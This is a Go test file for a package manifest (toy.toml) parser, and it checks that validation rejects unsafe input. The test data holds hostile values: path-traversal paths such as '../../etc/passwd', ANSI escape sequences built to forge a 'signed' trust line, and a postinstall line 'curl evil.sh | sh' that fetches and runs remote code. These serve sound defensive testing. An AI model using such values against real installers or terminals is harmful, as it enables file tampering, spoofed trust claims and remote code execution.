package toyfile

import (
	"errors"
	"os"
	"strings"
	"testing"
)

// good is the example from spec §3; each case below changes exactly one thing in it.
const good = `
name    = "tinyserve"
desc    = "a very small static file server"
license = "MIT"
homepage = "https://github.com/Derrity/tinyserve"

[bin]
tinyserve = "tinyserve"

[artifact]
"linux/amd64"  = "tinyserve_{version}_linux_amd64.tar.gz"
"darwin/arm64" = "tinyserve_{version}_darwin_arm64.tar.gz"
`

func TestParseAcceptsTheSpecExample(t *testing.T) {
	tf, err := Parse([]byte(good))
	if err != nil {
		t.Fatalf("the example from the spec must parse: %v", err)
	}
	if tf.Name != "tinyserve" || tf.License != "MIT" {
		t.Errorf("fields did not decode: %+v", tf)
	}
	if tf.IsScript() {
		t.Error("something with [artifact] must not be reported as the script form")
	}
	if got := tf.Bin["tinyserve"]; got != "tinyserve" {
		t.Errorf("bin = %q", got)
	}
}

func TestParseAcceptsScriptForm(t *testing.T) {
	tf, err := Parse([]byte(`
name = "mktoc"

[script]
mktoc = "mktoc-{version}.py"
`))
	if err != nil {
		t.Fatalf("the single-file script form must parse: %v", err)
	}
	if !tf.IsScript() {
		t.Error("[script] must be reported as the script form")
	}
	// The script form has no per-platform assets: Asset must say so, not hand back an empty string.
	if _, _, err := tf.Asset("linux", "amd64", "1.0.0", "v1.0.0"); err == nil {
		t.Error("Asset on the script form must error")
	}
}

// TestParseRejects covers every input validation must reject (spec §3, iron laws 4/5/7).
func TestParseRejects(t *testing.T) {
	cases := []struct {
		name string
		toml string
		want error // non-nil: asserted with errors.Is. nil: any error will do
	}{
		{
			name: "artifact and script both present",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[script]
x = "x.sh"`,
			want: ErrBothForms,
		},
		{
			name: "neither present",
			toml: `name = "x"
[bin]
x = "x"`,
			want: ErrNoArtifact,
		},
		{
			name: "empty name",
			toml: `[script]
x = "x.sh"`,
		},
		{
			name: "name contains a slash",
			toml: `name = "owner/x"
[script]
x = "x.sh"`,
		},
		{
			name: "name contains ..",
			toml: `name = "..x"
[script]
x = "x.sh"`,
		},
		{
			name: "name is exactly ..",
			toml: `name = ".."
[script]
x = "x.sh"`,
		},
		{
			name: "bin key contains a slash",
			toml: `name = "x"
[bin]
"sub/x" = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		},
		{
			name: "bin key is empty",
			toml: `name = "x"
[bin]
"" = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		},
		{
			name: "bin value is an absolute path",
			toml: `name = "x"
[bin]
x = "/usr/bin/x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "bin value has a .. segment",
			toml: `name = "x"
[bin]
x = "../../etc/passwd"
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "bin value hides a .. segment in the middle",
			toml: `name = "x"
[bin]
x = "a/../../b"
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "bin value is empty",
			toml: `name = "x"
[bin]
x = ""
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "script key contains a slash",
			toml: `name = "x"
[script]
"a/b" = "x.sh"`,
		},
		{
			name: "script value is an absolute path",
			toml: `name = "x"
[script]
x = "/tmp/x.sh"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "script value contains ..",
			toml: `name = "x"
[script]
x = "../x.sh"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "sha256 too short",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "abc123"`,
		},
		{
			name: "sha256 is uppercase",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855"`,
		},
		{
			name: "sha256 has non-hex characters",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "z3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855z"`,
		},
		{
			// Iron law 4: a declared hash must actually get used; a typo'd key silently skips verification.
			name: "sha256 key has no matching artifact",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/arm64" = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"`,
		},
		{
			name: "artifact key is not GOOS/GOARCH",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
linux = "x.tar.gz"`,
		},
		{
			name: "artifact but no bin",
			toml: `name = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		},
		{
			name: "the toml itself is malformed",
			toml: `name = `,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			tf, err := Parse([]byte(c.toml))
			if err == nil {
				t.Fatalf("this toy.toml must be rejected, but it parsed to %+v", tf)
			}
			if c.want != nil && !errors.Is(err, c.want) {
				t.Fatalf("wrong error type: want %v, got %v", c.want, err)
			}
			// Errors are written for humans: at minimum they say where the problem is.
			if len(err.Error()) < 10 {
				t.Errorf("error too short to act on: %q", err)
			}
		})
	}
}

// Only exactly 64 lowercase hex characters are accepted as a sha256.
func TestParseAcceptsExactly64LowerHex(t *testing.T) {
	const sum = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	if len(sum) != 64 {
		t.Fatalf("the test data itself is not 64 characters: %d", len(sum))
	}
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "` + sum + `"`))
	if err != nil {
		t.Fatalf("a valid sha256 was rejected: %v", err)
	}
	_, got, err := tf.Asset("linux", "amd64", "1.0.0", "v1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	if got != sum {
		t.Errorf("Asset did not carry the sha256 through: %q", got)
	}
}

func TestAssetExpandsPlaceholders(t *testing.T) {
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x_{version}_{tag}_linux_amd64.tar.gz"
"darwin/arm64" = "x_{version}_darwin_arm64.tar.gz"`))
	if err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		name             string
		goos, goarch     string
		version, tag     string
		wantAsset        string
		wantSHA          string
		wantErrSubstring []string // non-empty: expect ErrNoPlatform whose text contains all of these
	}{
		{
			name: "{version} drops the v, {tag} stays verbatim",
			goos: "linux", goarch: "amd64", version: "1.2.3", tag: "v1.2.3",
			wantAsset: "x_1.2.3_v1.2.3_linux_amd64.tar.gz",
		},
		{
			// A caller passing a v-prefixed version must not end up with a doubled v.
			name: "a v-prefixed version gets stripped",
			goos: "linux", goarch: "amd64", version: "v1.2.3", tag: "v1.2.3",
			wantAsset: "x_1.2.3_v1.2.3_linux_amd64.tar.gz",
		},
		{
			name: "a tag without v is also verbatim",
			goos: "darwin", goarch: "arm64", version: "2.0.0", tag: "2.0.0",
			wantAsset: "x_2.0.0_darwin_arm64.tar.gz",
		},
		{
			name: "prerelease versions pass through unchanged",
			goos: "darwin", goarch: "arm64", version: "v1.0.0-rc.1", tag: "v1.0.0-rc.1",
			wantAsset: "x_1.0.0-rc.1_darwin_arm64.tar.gz",
		},
		{
			// The spec requires the error to name the platforms it does support, so the user
			// knows what to ask for upstream.
			name: "a missing platform lists the ones it declares",
			goos: "windows", goarch: "amd64", version: "1.0.0", tag: "v1.0.0",
			wantErrSubstring: []string{"windows/amd64", "linux/amd64", "darwin/arm64"},
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			asset, sum, err := tf.Asset(c.goos, c.goarch, c.version, c.tag)
			if len(c.wantErrSubstring) > 0 {
				if !errors.Is(err, ErrNoPlatform) {
					t.Fatalf("want ErrNoPlatform, got %v", err)
				}
				for _, want := range c.wantErrSubstring {
					if !strings.Contains(err.Error(), want) {
						t.Errorf("error text is missing %q: %s", want, err)
					}
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if asset != c.wantAsset {
				t.Errorf("asset = %q, want %q", asset, c.wantAsset)
			}
			if sum != c.wantSHA {
				t.Errorf("sha256 = %q, want %q", sum, c.wantSHA)
			}
		})
	}
}

func TestPlatformsIsSorted(t *testing.T) {
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64"  = "a"
"darwin/arm64" = "b"
"linux/arm64"  = "c"`))
	if err != nil {
		t.Fatal(err)
	}
	got := tf.Platforms()
	want := []string{"darwin/arm64", "linux/amd64", "linux/arm64"}
	if len(got) != len(want) {
		t.Fatalf("Platforms() = %v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("Platforms() = %v, want %v", got, want)
		}
	}
	// Stable order: two calls in a row agree (map iteration order is randomized).
	for i := 0; i < 20; i++ {
		again := tf.Platforms()
		for j := range got {
			if again[j] != got[j] {
				t.Fatalf("order changed on call %d: %v vs %v", i, again, got)
			}
		}
	}
}

func TestPlatformsOnEmptyIsNotNil(t *testing.T) {
	var tf Toyfile
	if got := tf.Platforms(); got == nil || len(got) != 0 {
		t.Errorf("Platforms() on an empty Toyfile must be an empty slice, not nil: %v", got)
	}
	// With no platforms declared at all the error still has to say something, not go blank.
	_, _, err := tf.Asset("linux", "amd64", "1.0.0", "v1.0.0")
	if !errors.Is(err, ErrNoPlatform) {
		t.Fatalf("want ErrNoPlatform: %v", err)
	}
	if !strings.Contains(err.Error(), "linux/amd64") {
		t.Errorf("the error should name the current platform: %s", err)
	}
}

// The rest came out of the adversarial review: every one of these inputs really did
// parse before it.

// The spec §3 example and both examples/ files must keep parsing -- new strict
// validation must never reject the project's own documentation.
func TestParseAcceptsShippedExamples(t *testing.T) {
	// go test always runs with cwd set to the package directory, so these relative paths
	// are stable. If a file cannot be read it has been moved, and that must go red --
	// never Skip, which would let this case pretend to pass.
	for _, path := range []string{"../../examples/toy.toml", "../../examples/toy.script.toml"} {
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("cannot read %s: %v", path, err)
		}
		if _, err := Parse(data); err != nil {
			t.Errorf("%s was rejected: %v", path, err)
		}
	}
}

// An [artifact] value is appended verbatim to the release download URL, so it is under
// the same constraints as a [bin]/[script] value (iron laws 7 and 8). Before the review
// this section had no validation at all.
func TestArtifactAssetNameCannotEscapeTheRelease(t *testing.T) {
	cases := map[string]string{
		"path traversal into someone else's repo": "../../../../victim/repo/releases/download/v1/evil.tar.gz",
		"absolute path":                     "/etc/passwd",
		"empty asset name":                  "",
		"a .. segment hidden in the middle": "dir/../../x.tar.gz",
	}
	for name, asset := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "` + asset + `"`))
			if err == nil {
				t.Fatalf("asset name %q must be rejected: it points the download URL somewhere else "+
					"while the client still prints \"source github.com/<author>\" from toy.toml", asset)
			}
			if !errors.Is(err, ErrUnsafeTarget) {
				t.Fatalf("want ErrUnsafeTarget: %v", err)
			}
		})
	}
}

// {version}/{tag} come from the remote; only the expanded string is what actually goes
// into the URL.
func TestAssetRejectsTraversalIntroducedByExpansion(t *testing.T) {
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x_{tag}.tar.gz"`))
	if err != nil {
		t.Fatal(err)
	}
	if asset, _, err := tf.Asset("linux", "amd64", "1.0.0", "../../../../evil/releases/download/v9/pwn"); err == nil {
		t.Fatalf("an asset name containing .. after expansion must be rejected, got %q", asset)
	}
	// Not one ordinary tag may be caught in the crossfire.
	for _, tag := range []string{"v1.2.3", "1.2.3", "v1.0.0-rc.1", "release-2026.08"} {
		if _, _, err := tf.Asset("linux", "amd64", tag, tag); err != nil {
			t.Errorf("ordinary tag %q was rejected: %v", tag, err)
		}
	}
}

// Iron law 8: the trust level must be printed honestly. Every one of these fields goes
// to the terminal verbatim, and a carriage return plus an ANSI sequence erases the line
// already printed and rewrites it, forging a "signed" claim.
func TestControlCharactersCannotForgeTheTrustLine(t *testing.T) {
	const forge = `ok\u001b[2K\r\u2713 signed-by-Derrity`
	cases := map[string]string{
		"desc": `name = "x"
desc = "` + forge + `"
[script]
x = "x.sh"`,
		"name": `name = "x` + forge + `"
[script]
x = "x.sh"`,
		"license": `name = "x"
license = "MIT` + forge + `"
[script]
x = "x.sh"`,
		"bin name": `name = "x"
[bin]
"x` + forge + `" = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		"bin path": `name = "x"
[bin]
x = "x` + forge + `"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		"script asset name": `name = "x"
[script]
x = "x` + forge + `.sh"`,
	}
	for field, src := range cases {
		t.Run(field, func(t *testing.T) {
			tf, err := Parse([]byte(src))
			if err == nil {
				t.Fatalf("a control character in %s must be rejected, but it parsed to %+v", field, tf)
			}
		})
	}
	// Ordinary non-ASCII text, spaces and punctuation must not be caught in the crossfire:
	// checkPrintable rejects runes below 0x20 and 0x7f, and nothing else.
	if _, err := Parse([]byte(`name = "x"
desc = "Tiny static file server — v2 (Ελληνικά, Русский, 🎉)"
license = "MIT"
homepage = "https://example.com/a?b=1&c=2"
[script]
x = "x.sh"`)); err != nil {
		t.Errorf("ordinary multibyte text was rejected: %v", err)
	}
}

// Unknown keys must be reported, never silently ignored: a mistyped section name like
// [sha265] means "the author believes they pinned a hash, the client never verified
// anything" -- exactly what iron law 4 exists to prevent.
func TestUnknownKeysAreRefusedNotIgnored(t *testing.T) {
	const typo = `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha265]
"linux/amd64" = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"`
	cases := map[string]string{
		"sha256 section name typo": typo,
		"artifact section name typo": `name = "x"
[bin]
x = "x"
[artifacts]
"linux/amd64" = "x.tar.gz"
[script]
x = "x.sh"`,
		// Iron law 1: toy runs no code from a package. Ignoring these keys would let an author
		// believe they took effect.
		"postinstall": `name = "x"
postinstall = "curl evil.sh | sh"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		"[install] section": `name = "x"
[install]
run = "make"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			tf, err := Parse([]byte(src))
			if err == nil {
				t.Fatalf("must be rejected, but it parsed to %+v", tf)
			}
		})
	}
	// The error must name the offending key, or the author has nothing to act on.
	if _, err := Parse([]byte(typo)); err == nil || !strings.Contains(err.Error(), "sha265") {
		t.Errorf("the error should name the unrecognized key: %v", err)
	}
}

// A platform key with the wrong case or stray whitespace does not fail, it just never
// matches -- the author thinks they shipped a Linux build while the user is told there
// is no build for their platform.
func TestPlatformKeyMustMatchGOOSGOARCHByteForByte(t *testing.T) {
	for _, plat := range []string{"Linux/AMD64", "linux/AMD64", " linux/amd64", "linux/amd64 ", "linux /amd64"} {
		t.Run(plat, func(t *testing.T) {
			if tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"` + plat + `" = "x.tar.gz"`)); err == nil {
				t.Fatalf("platform key %q must be rejected, but it parsed to %+v", plat, tf)
			}
		})
	}
}

// The script form with a [sha256] is still rejected (those hashes can never be used,
// iron law 4), but the error has to say it is a problem with the form instead of
// pointing at [artifact].
func TestScriptFormRejectsSHA256WithAnHonestMessage(t *testing.T) {
	_, err := Parse([]byte(`name = "x"
[script]
x = "x.sh"
[sha256]
"linux/amd64" = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"`))
	if err == nil {
		t.Fatal("must be rejected")
	}
	if !strings.Contains(err.Error(), "script") {
		t.Errorf("the error should say this is a [script]-form problem: %v", err)
	}
}

// Asset names are appended verbatim to the download URL, and ? and # cut off everything
// after them -- a different file comes back while the client keeps saying "source
// github.com/<author>" from toy.toml. fetch has always preferred erroring over guessing
// for file://; the rule has to be the same on both sides.
func TestRejectsQueryAndFragmentInPaths(t *testing.T) {
	for _, body := range []string{
		"name = \"t\"\n[bin]\nt = \"t\"\n[artifact]\n\"linux/amd64\" = \"t_{version}.tar.gz?raw=1\"\n",
		"name = \"t\"\n[bin]\nt = \"t\"\n[artifact]\n\"linux/amd64\" = \"t#v2.tar.gz\"\n",
		"name = \"t\"\n[script]\nt = \"t.sh?x\"\n",
	} {
		if _, err := Parse([]byte(body)); !errors.Is(err, ErrUnsafeTarget) {
			t.Errorf("want ErrUnsafeTarget, got err = %v\n%s", err, body)
		}
	}
	// Not one ordinary asset name may be caught in the crossfire.
	ok := "name = \"t\"\n[bin]\nt = \"bin/t\"\n[artifact]\n\"linux/amd64\" = \"t_{version}_linux_amd64.tar.gz\"\n"
	if _, err := Parse([]byte(ok)); err != nil {
		t.Errorf("an ordinary toy.toml was rejected: %v", err)
	}
}
